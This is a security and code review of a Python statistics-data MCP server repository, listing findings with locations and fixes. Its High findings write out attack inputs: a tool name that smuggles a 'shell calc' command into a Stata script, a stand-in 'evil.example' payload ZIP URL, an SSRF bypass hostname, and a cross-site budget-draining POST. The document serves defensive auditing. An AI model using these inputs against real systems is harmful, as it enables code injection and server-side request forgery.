# MapleStats MCP — full repository review (2026-10-16)

Scope: the whole repository at commit `aead300` (main). About 140,000 lines of
Python across `server.py`, `config.py`, `shared/`, 70 source modules, the
planner and reproduce modules, `scripts/`, `site/`, the `chat/` demo, CI and
deployment files, and docs. Every file in those areas was read; every finding
below was verified against the code, and the two High items in `reproduce`,
the chat item and the ISQ item were reproduced or traced end to end. No files
were edited.

## Gate

| Check | Result |
|---|---|
| `ruff check src tests scripts` | clean |
| `ruff format --check` | 928 files formatted |
| `pyright` | 0 errors |
| `pytest -n 4 --dist loadfile` | 3292 passed, 10 skipped, 2 min 11 s |

The 10 skips are "R / Julia / node not installed" gates. CI installs neither
R nor Julia packages, so the tests that execute generated `reproduce_code`
scripts never run anywhere but a developer machine (see H-6).

Mechanical contract checks across all 357 tools: every tool returns a typed
model with provenance, raises typed errors (no dict-shaped errors anywhere),
uses the shared HTTP client, and carries `lang`, `Use for:`, `Keywords:` and
`Mots-clés :`. No `.get(key, [])` on external JSON. The git tree is clean of
build artifacts.

## High — fix before the next release

**H-1. Stata code injection through `tool_name` in `reproduce_code`.**
`modules/reproduce/render.py:1024` writes `log using "logs/{tool[:32]}.log"`
with the raw tool name, while every other use of the name goes through
`comment_text(..., stata=True)`. The argument-only route
(`builders.py:547 builder_for()`) accepts any name starting `wds_`/`sdmx_`
when `product_id` is present, so `_run_tool`'s existence check is skipped.
Reproduced: a tool name of `wds_"` + newline + `shell calc` + newline + `*`
with `{"product_id": 18100004}` and `language="stata"` yields a do-file
containing a bare `shell calc` line. `tests/test_reproduce.py:880` covers
hostile arguments only, never the name. Fix: escape or validate `tool`
before `log using`, and require the name to exist in the registry even on
the argument-only path.

**H-2. `reproduce_code` emits scripts that download and unzip an arbitrary URL.**
`modules/reproduce/builders.py:187 _pumf` takes `args["url"]` checking only
`.endswith(".zip")`; `argument_only()` (`:558-560`) runs it without the tool.
The real tool enforces `statcan/pumf/client.py:58 _check_url` (https, allowed
host). Reproduced: `reproduce_code("statcan_pumf_list_files", {"url":
"https://evil.example/payload.zip"})` returns `method="exact: the PUMF ZIP"`
and Python/R/Julia/Stata code that fetches and extracts that URL into
`data/raw/`. An LLM fed an injected URL hands the analyst a trusted-looking
script. Fix: call `_check_url` inside `_pumf`.

**H-3. SSRF in ISQ via a string-prefix host check.**
`modules/isq/client.py:361-362` accepts any `table` that
`startswith("https://statistique.quebec.ca")` and contains
`/produit/tableau/`, then fetches it as-is. `SITE` has no trailing slash, so
`https://statistique.quebec.ca.attacker.example/produit/tableau/x` and
`https://statistique.quebec.ca@attacker.example/...` pass and the server
requests an arbitrary host. No test exercises the URL form. Fix:
`urlparse(table).hostname == "statistique.quebec.ca"` and scheme `https`.

**H-4. Chat demo's `/api/chat` accepts cross-site "simple" POSTs.**
`chat/app.py:345-375` parses any body with `json.loads` and checks neither
`Content-Type`, `Origin` nor `Sec-Fetch-Site`; Starlette's `CORSMiddleware`
with `allow_origins=[]` only withholds headers, it never rejects. Any web
page can `fetch(..., {mode:"no-cors", body})` from its visitors' browsers and
spend the model budget (20 calls/hour per visitor IP, 500/day total). This
is the budget-drain path the recent `frame-ancestors`/referrer work set out
to close. Fix: require `Content-Type: application/json` (and/or a custom
header or `Sec-Fetch-Site: same-origin`) before parsing.

**H-5. SDMX structure from the WDS fallback silently sees only 100 members
per dimension.** `modules/statcan/sdmx/client.py:255 _structure_from_wds`
calls `wds_client.get_cube_metadata(product_id)` with the default
`member_limit` (100, `wds/constants.py:27`). For tables whose SDMX structure
document is empty or truncated (documented LFS and census cases) and whose
geography or NAICS dimension has more than 100 members,
`sdmx_get_key_for_dimension` ("a complete OR key covering every leaf code")
returns at most 100 ids, parents whose children were cut off are
misclassified as leaves, and `sdmx_get_structure` reports the truncated
count as the full size. Data queries then silently omit most of the
dimension. The only mocked test uses 2-member dimensions. Fix: pass
`member_limit=MEMBER_LIMIT_MAX` and page with `member_offset` until
`members_matched` is covered.

**H-6. CI never runs the tests that execute generated R and Julia code.**
`ci.yml` installs no R and no Julia packages; `tests/test_reproduce_cfia.py`
(lines 652, 681, 717, 750) and `tests/test_reproduce.py:987-1001` skip on
the runner every time. A regression in a headline feature merges green.
Fix: add `r-lib/actions/setup-r` plus the package list, and a Julia
`Pkg.add` step, to one matrix leg.

## Medium

### Systemic patterns (one fix each, many call sites)

**M-1. Byte caps applied after the whole body is already in memory.**
`shared/http.py:329 get_raw` buffers the full response, so every
`len(response.content) > MAX` check bounds parsing, not the download. The
streaming, host-checked `shared/file_download.download()` already exists
and is used by oeb, nwt_stats, ab_opendata, bc_stats, yukon_stats, ckan,
bc_environment and eccc_datamart. Still buffering first:
`shared/csv_files.py:108` (no Content-Length pre-check either),
`shared/remote_zip.py:139` (a non-streamed Range GET: a host that stops
honouring `Range` returns 200 and the 3.9 GB Delta zip is loaded before the
206 check; `cd_size` at `:236` is also unbounded), `bc_lobbyists/client.py:610`
(150 MB), `recalls/client.py:254` (no cap), `cgc/client.py:406`,
`ircc/monthly/client.py:358`, `nfd/client.py:193`, `finance_canada/client.py:113`,
`elections_results/candidates.py:141` and `historical.py:161`,
`cdc/client.py _page`, `phac_infobase/client.py:338`,
`elections_provincial/common.py:87`, `cfia/client.py _fetch`,
`ised/clean_growth _page`, `nl_stats/client.py:372`, `cihi/client.py:488`,
`pmra/client.py:137`, `nrcan_minerals/client.py:231`, `pmprb/client.py:148`,
`isq/client.py:97`. On the 512 MB hosted instance a grown upstream file is an
OOM kill, not an `UpstreamError`.

**M-2. Empty scrape cached as a successful empty result.** When the
expected container is absent the parser returns `[]` instead of raising, and
the cache keeps it: `cmhc/client.py:514 list_categories` and `:595
list_provinces` (24 h; afterwards `_check_geography` rejects every province
id), `cihi/client.py:164 _library` (7 days; `search_indicators` then reports
0 matches), `nl_stats/client.py:129 parse_topic_page` (6 h). Related:
`earthquakes/client.py:43` maps a 404 to an empty body, so a moved FDSN
endpoint reads as "no earthquakes" for 5 min. Contrast `nl_opendata/client.py:151`
and `cmhc get_table_options`, which raise. Fix: raise `UpstreamError` on a
missing container, as cfia's `_LayoutChanged` does.

**M-3. Redirect hops not re-validated.** `shared/csv_files.py:66-74` checks
only `https` on the redirect target and never re-applies the caller's host
allow-list (`file_download.py:103` does). `nfd/client.py:167-180` follows
redirects to any host over plain HTTP (`BASE_URL` is `http://` by design),
so an on-path party or a compromised redirect can point the server at an
internal address. `shared/remote_zip.py:50-56` also accepts any tenant of
`*.amazonaws.com`, `*.cloudfront.net`, `*.blob.core.windows.net` and
`*.storage.googleapis.com` on redirect.

**M-4. Portal-family error mapping has diverged.** `shared/ckan.py:86`,
`shared/socrata.py:342` and `shared/opendatasoft.py:94` turn every non-404
4xx, including 429 after retries, into `InvalidInput` "rejected the
request", while `shared/arcgis.py:181` and `shared/wfs.py:333` map 429 to
`UpstreamUnavailable`. `_network_error_fr` is copied in four places
(`arcgis.py:208`, `socrata.py:357`, `ckan.py:108`, `opendatasoft.py:122`)
although `upstream_text.network_error` already exists.

### Specific

**M-5. `statcan/surveys/client.py:234-249` caches a non-200 IMDB response
for 24 h.** `get_with_retry` returns the last response even when still 5xx,
`cached_fetch` stores it, and only then does line 265 raise. One 503 blip
makes every call for that survey fail for a day. This is the only module
that checks `status_code` after `cached_fetch` (grep confirmed), so a local
fix suffices: raise inside `fetch()`.

**M-6. `reproduce_workbook` chart-data header can be stored as formulas.**
`modules/reproduce/workbook.py:572` appends the header without
`data_type="s"` (data rows at `:589` get it), and `:677` builds the chart
header from series *values* taken from the data. Rows whose series name is
`=HYPERLINK(...)` produce formula header cells, an openpyxl "column headings
must be strings" warning, and a Table whose column names no longer match
(Excel repair prompt). The data sheet is protected; the chart sheet is not.

**M-7. `reproduce_code("reproduce_workbook", ...)` runs the export as a side
effect.** `modules/reproduce/client.py:51 _NOT_DATA` omits
`reproduce_workbook` (`workbook.py:56` lists both), so `_spec` falls through
to `_run_tool`; on a stdio server with `delivery="auto"` that writes an
`.xlsx` into Downloads or `MAPLE_EXPORT_DIR`, then reports "nothing to
fetch". (The reviewer ran this once; a `side_effect_<timestamp>.xlsx` may
now sit in your Downloads folder.)

**M-8. Planner term data.** `planner/topics.py:870` lists `"or"` (gold)
under minerals, so almost every English question with "or" gets a minerals
topic and `nrcan_minerals_*` steps ("rents or interest rates" → minerals).
`:326 "yield"` and `:323 "dollar"` put `rates` first for "canola yield in
Saskatchewan". Plural entries double-count against `_pattern()`'s own
`(?:s|es)?` suffix (`precipitation` at `:711`/`:723`, `pesticide(s)`,
`herbicide(s)`, `tax filer(s)`, `registered charit(y|ies)`, `mine(s)`), so
"Pesticides registered for canola" ranks pesticides 2 vs agriculture 1.
`:873 "minéraux critiques"` can never match because `_normalize()` strips
accents from the question first. `places.py:183/188` aliases (`london`,
`victoria`, `NB`) keep "London, England" and "Victoria, Australia" in scope
and attach an Ontario or BC portal, because `_foreign_place` is skipped
whenever `places` is non-empty.

**M-9. `electricity/quebec_client.py:145`** embeds `datetime.now(UTC)` to the
second in the ODSQL `where`, which is also the cache key, so
`get_generation("recent")` and `get_trade` never hit the 5-minute cache,
make two upstream requests per call, and leave one-off keys behind.

**M-10. `bcgw/client.py:396-408`** fetches up to 1000 full polygons with no
byte budget when `include_geometry=True` and returns them all to the model;
`nrcan_nbac/client.py:129-160` trims to `GEOMETRY_BYTES_MAX` only after
downloading the full GeoJSON (its own note: 5 fires = 33 MB) and caches the
whole body for 24 h per distinct filter.

**M-11. `boc/client.py:265, 322, 546, 569`** read `row["d"]`,
`obj["seriesDetails"]` and `obj["groupDetails"]` unguarded; a changed Valet
payload surfaces as `KeyError: 'd'` with no guidance. `KeyError` is not a
`ValueError`, so it bypasses the typed-error mapping.

**M-12. `oeb/client.py:428-429 _select_file`:** `file="0"` returns
`files[-1]`, and a numeric position indexes `files`, not the
release-filtered `pool`, so `release="2023-04-30", file="1"` silently returns
the first *current* file with provenance pointing at the wrong URL.

**M-13. `aer/client.py` `get_well_licences_daily`:** `raise_for_status()`
sits inside a `try` whose only handler is `except httpx.HTTPError`, so a
404/500 on `WELLS{DAY}.TXT` is reported as `UpstreamUnavailable` "did not
respond in time"; the raw `_client.get` also skips `send_with_retry`.

**M-14. `statcan/pumf/tabulate.py:287-290`** does not wrap `duckdb.Error`
(`lode/reader.py:512` does), so a ragged CSV or a replicate join missing
`method.id_variable` surfaces as a raw `BinderException`/`KeyError`.
`tabulate.py:97-105` and `lode/files.py:63-71` run cache eviction outside
the `try/finally`, so a Windows `PermissionError` on an open file
propagates raw, and eviction can remove another call's `.part` download or a
`target` it just found.

**M-15. `statcan/census_profile/client.py:305-309`** interpolates
`geography_codes` and `characteristic_codes` into the path and cache key
with no validation, unlike rdaas, geo, sdg and both SDMX clients; a code
with `/`, `#` or whitespace reshapes the URL and yields a confusing 404
instead of `InvalidInput`.

**M-16. Core and config.**
`shared/security.py:32-36 _header()` returns only the first header line, so
with `MAPLE_TRUST_PROXY_HEADERS=1` a repeated `X-Forwarded-For` header lets a
caller pick its own rate-limit bucket if the proxy appends a second line
rather than joining (plausible; Render's behaviour not verified).
`config.py:26-30 get_transport()` maps any value other than `stdio` to
`http`, so `MAPLE_TRANSPORT=sdtio` silently starts an HTTP server while the
MCP client waits on stdin. `asgi.py:54` builds `app` at import time without
the `MAPLE_REQUIRE_AUTH` refusal that lives only in `__main__.main()`, so
`uvicorn maplestats_mcp.asgi:app` with `MAPLE_REQUIRE_AUTH=1` and no token
serves an unauthenticated `/mcp`.

**M-17. Supply chain and chat demo.** `.github/workflows/release.yml:97`
runs `npx -y @smithery/cli@4.11.1` holding `SMITHERY_API_KEY` with no
lockfile or integrity check (the comment says "pinned, like mcp-publisher",
which is SHA-256-verified; this is not). `chat/static/index.html:79-80`
loads `marked@12.0.2` and `dompurify@3.1.6` from cdnjs without `integrity`
attributes and renders model output through `innerHTML`; DOMPurify has
shipped security fixes since 3.1.6, and `tests/test_site.py:712` forbids
third-party scripts on the main site for this reason. `.github/dependabot.yml`
covers only the root `uv` lock; `chat/uv.lock`, the one component holding a
secret, never gets update PRs. `chat/app.py:87 client_address()` trusts
`X-Forwarded-For` unconditionally (fine on Render, forgeable when run as the
README documents).

**M-18. French number parsing.** `cmhc/client.py:406 _parse_value_cell`
strips every comma as an English thousands separator and runs on the French
export too; if the French CSV writes "1,5", it becomes 15.0 (plausible; one
live French export would settle it). `finance_canada/client.py:216 _number`
has the same English-only assumption while `monitor.py:113` handles the
French comma; `ised/clean_growth/client.py:74` makes the opposite assumption
(every comma is a decimal mark).

## Low

Error-class edges: `drivebc/client.py:113` lets `RemoteProtocolError` and
`TooManyRedirects` escape untyped; `health_products/api.py:138-147` catches
`NotJsonResponse` as `UpstreamUnavailable` and the `except ValueError`
meant for it instead relabels `CloudflareChallenge` (repeated at `:263`);
`elections_provincial/british_columbia.py:140` lacks the parser `try` wrapper
its Saskatchewan and Manitoba siblings have; `borealis/client.py:61-66`
passes user words into Solr `q` unescaped (`-2021` becomes a prohibit
operator, `AND` a syntax error reported as an upstream fault);
`recalls/client.py:645` fetches pages with a raw `_pages.get` (no retry, no
Cloudflare check); `competition_bureau/client.py:117` unpacks exactly 5 cells
from rows kept at 4 or more; `cra_charities/client.py:322, 396`
`int(result.get("total", ...))` fails on a null total; `ckan/client.py:468`
calls `len(page)` before the `isinstance` guard; `eccc/coverages/client.py:201`
lets `get_raw`'s 406/409 pass-through reach `.json()`; `transit/client.py:1041,
1145` call `_scan_stop_times` without `lang`; `statcan/sdmx/client.py:108`
reports 400/403 as "unavailable (already retried)"; `statcan/wds/client.py:817`
sorts `vector_ids` in the cache key but labels failed vectors by request
position, so a reordered call mislabels the failure; `statcan/delta/archive.py:561`
and `cimt/client.py:529` have bare `int()`/dict lookups that can escape as
`ValueError`/`KeyError`; `nrcan_geo/client.py:296` passes an unvalidated
`bbox` and blames the client for the resulting 404; `arcgis_hub`
`_download_links` guards `default_layer_index` but not
`supported_download_formats` (a `CloudflareChallenge` fails the whole
`get_dataset`); `ircc/monthly/client.py:233` fails the whole table on one
unexpected `TOTAL` cell; `oeb/records.py:59` coerces digit-only strings to
`int`, dropping zero padding; `modules/reproduce/render.py:1078`
double-escapes the Julia POST body so a `$` produces invalid JSON.

Shared helpers: `shared/csv_files.py:29` decode falls back to cp1252 only
(`file_tables.decode` has the latin-1 last resort); `shared/xlsx_sheets.py:220`
never applies `file_tables._fix_dimensions` for the two live-confirmed
`<dimension>` writer bugs; `shared/file_tables.py:123` `lstrip()` copies up
to 40 MB and misses a BOM-prefixed HTML page; `shared/zip_stream.py:426`
inflates on `asyncio.to_thread` despite `executor.py`'s own warning;
`shared/file_download.py:118` reads an error body uncapped;
`shared/private_logs.py:45` attaches the scrubbing filter only to
`fastmcp.server.server`, while fastmcp 4.1 logs prompt-render failures (with
arguments in frames) from `fastmcp.prompts.function_prompt`, and
`tests/test_privacy.py:57` logs by hand onto the filtered logger so it does
not exercise the real path; `shared/executor.py:50-58, 113-120` race on the
deadline so `tests/test_shared_executor.py:54` (`match="longer than"`) can
flake; `shared/security.py:230` subdomain wildcard never matches an origin
with a port; `shared/cache.py:168` a waiter cancelled as the owner's fetch is
cancelled can swallow its own cancellation (narrow); `shared/usage.py:94`
comment is wrong for fastmcp 4.1 (tool failures re-raise as `ToolError`);
`shared/models.py:63 ErrorPayload` is dead code at odds with the
raise-not-return rule; `config.py:18-23` and every numeric getter fall back
to the default silently on an unparsable value (`MAPLE_PORT=80OO` binds 8000
while the Dockerfile healthcheck probes `localhost:80OO`);
`modules/_example/tools.py:25` declares `lang` but never passes it on, so
copies inherit a dead parameter.

Tests: no mocked coverage for the SDMX WDS-fallback member cap, a cached
non-200 IMDB response, malformed census-profile codes, a DuckDB failure in
tabulate, reordered cached vector ids, the earthquakes 404 branch, the AER
non-2xx daily file, the IRCC `_count` error branch, the ISQ URL form of
`table`, or CGC's multi-pass handshake loop (`cgc/client.py:370-432`).

Docs and ops drift: `README.md:208-227` env table omits `MAPLE_USAGE_STATS`
(which turns on the public `/stats` route the README never mentions),
`MAPLE_LODE_CACHE_DIR`, `MAPLE_LODE_CACHE_MAX_GB`, `MAPLE_LODE_MAX_DOWNLOAD_MB`
and `MAPLE_EXPORT_DIR`, all listed in `site/connect.html:179-196`; README
says `MAPLE_REQUIRE_AUTH` defaults to 0 while `docker-compose.yml:11`
defaults it to 1. `site/connect.html:205` says two named volumes; compose
declares three. `docs/ROADMAP.md` launch table still says uptime monitoring
is "not yet deployed" and 0.1.1 is the latest release (v0.3.0 shipped
2026-10-10). Broken relative links: `docs/PROJECT_GUIDE.md:176, 197`,
`docs/statcan-api-standard.md:5`, `docs/findings/specialized-federal-sources.md:1578`.
`SECURITY.md:18` asks for `maplestats-mcp --version`, which `__main__.py`
does not implement (it starts the stdio server). `uv==0.11.7` is pinned in
both Dockerfiles but the four workflows use `setup-uv` with no `version:`.
`uptime.yml` and `keepalive.yml` have no `permissions:` block (no practical
exposure today). `server.json` lists only the PyPI stdio package and no
`remotes` entry for the hosted Streamable HTTP endpoint the README makes the
default.

## Checked and found sound

Supply chain: every action SHA resolves to the tag in its comment; no
`pull_request_target`; PR-triggered workflows use no secrets; `release.yml`
re-runs the full gate on the tagged commit and uses PyPI trusted publishing;
`pages.yml` builds only `workflow_run.head_sha` of a successful push;
`smoke.yml`'s alert job is scoped to `actions: read, issues: write`. Both
Dockerfiles pin `python:3.14-slim` by digest, run as non-root and sync
`--locked`; env names and defaults agree across `config.py`, compose,
`render.yaml` and `connect.html` apart from the README gaps above.

Security middleware: `/mcp` is a Starlette `Route`, so the exact-path guard
cannot be bypassed with `/mcp/anything`; token comparison is constant-time;
rate limit runs before auth; the window check allows exactly `n`;
`asyncio.wait_for(slots.acquire())` does not leak a slot on 3.12. The cache's
single-flight and two-level size bounding, the parse pool's cooperative
deadline, `ToolTimeoutMiddleware`'s cancel scope and `UsageMiddleware`'s
re-entry guard are all correct and tested. `http2=True`, `tzdata` and
`list_or_empty()` are intact.

Data modules: user-supplied URLs in pumf, lode, transit and bc_environment
are pinned to allow-listed hosts; redirects in `remote_zip` are same-site
checked; every path segment in rdaas, geo, sdg, sdmx and sdmx_spaces is
regex-validated; archive members are written as `Path(member).name` under a
hashed key (no zip-slip); downloads and ZIP inflation are capped before
writing where `file_download`, `remote_zip.read_member` and `zip_stream` are
used, with bomb, short-range, ZIP64 and off-site-redirect tests; DuckDB and
sqlite queries quote identifiers only after matching the real column list
and parameterise every value; `wfs.py` uses `defusedxml`; ArcGIS `where`
values are quote-escaped and `service_url` comes from the portal's own item
record; CQL literals are escaped and bboxes validated in cwfis; "today" uses
`America/Toronto` wherever StatCan reference periods matter; the two odd WDS
body shapes and the 404/406/409 mappings are right;
`elections_financial_returns`, `fcac`, `statcan/reference` and
`statcan/surveys` follow the re-warm-once session rule with lost-session
tests; `cfia` and `eccc_datamart` fail loudly on every structural
assumption; `transit`'s range-streamed `stop_times.txt` with feed-replaced
detection is the strongest module in the repo.

Reproduce and planner: `_safe_spec`, `comment_text`, `_stata_literals` and
`m_text` make user text inert per language, with hostile-input tests for
each; the Stata one-statement-per-line rewrite and the structural M checker
hold; user filter keys cannot reach R's unescaped backticks because every
builder that uses them runs the tool first and the tools reject unknown
columns; data-row formula injection in the workbook is handled; sheet names
respect the 31-character limit; every planned tool and portal is checked
against the registry; every planner string has a French entry enforced by
test. The `httpx.Client` at `reproduce/cfia.py:226` is inside a raw-string
template emitted into the analyst's script, not a server-side call.

Site: `build_site.py` escapes every docstring-derived string,
`french_typography()` skips `<code>`, `<script>`, `<style>` and `lang="en"`
elements, and `site.js` `tokenize()`, `fold()` and `STOP_WORDS` match
`shared/search.py` with the node parity test running in CI (node is on the
runner; R is not).

## Overall

This is an unusually disciplined codebase for its size: the architectural
contracts in `AGENTS.md` hold mechanically across all 357 tools, live-verified
API quirks are documented at the call site with dates, the security and
supply-chain layers are real rather than decorative, and the test suite
enforces many hand-typed facts (tool counts, docstring lines, live coverage,
French discovery). The six High items are all small, local fixes; the two in
`reproduce` share one root cause (the argument-only fast path trusts
`tool_name` and `url` without the validation the real tool performs). Beyond
those, the most valuable work is the three systemic Medium patterns, each
closable with one shared change: move the remaining buffer-then-cap readers
onto `shared/file_download.download()` (which also closes the NFD and
csv_files redirect holes), make every scraper raise on a missing container
instead of caching an empty list, and consolidate the five portal helpers'
status and network error mapping onto one function.
